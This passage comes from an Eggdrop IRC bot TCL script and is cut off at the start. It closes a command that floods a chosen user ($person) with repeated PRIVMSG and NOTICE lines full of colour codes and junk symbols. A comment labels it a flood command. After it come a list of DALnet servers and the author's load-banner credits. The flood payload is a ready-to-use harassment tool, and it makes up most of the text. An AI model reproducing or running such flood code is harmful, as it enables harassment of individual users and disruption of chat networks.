puthelp "PRIVMSG $person :3,9|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@8,12#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "NOTICE $person :8,1|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@2,13#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "PRIVMSG $person :13,4|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@0,3#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
puthelp "NOTICE $person :10,12|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@14,5#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
putlog "!$hand! modar $person"
return 0
}
}
## public cmd flood fluud -- stop
##### DALNET SERVER #######
set servers {
mesra.kl.my.dal.net:6667
matrix.dal.net:7000
acool.dal.net
powertech.dal.net
arcor.dal.net
astro.dal.net
mozilla.dal.net
matrix.dal.net:6667
toronto.dal.net
eternal.dal.net
animals.dal.net
twisted.dal.net
liberty.dal.net
tiscali.dal.net
omen.dal.net
games.dal.net
phoenix.dal.net
}
putlog "===================================="
putlog "bhl tcl   loaded...                 "
putlog "Reported any bugs to #Guardian"
putlog "Question Go To #Guardian      "
putlog "Web  : http://eggdrop.freeoda.com/tcl     "
putlog "Email: kazuya@i.am        "
putlog "===================================="
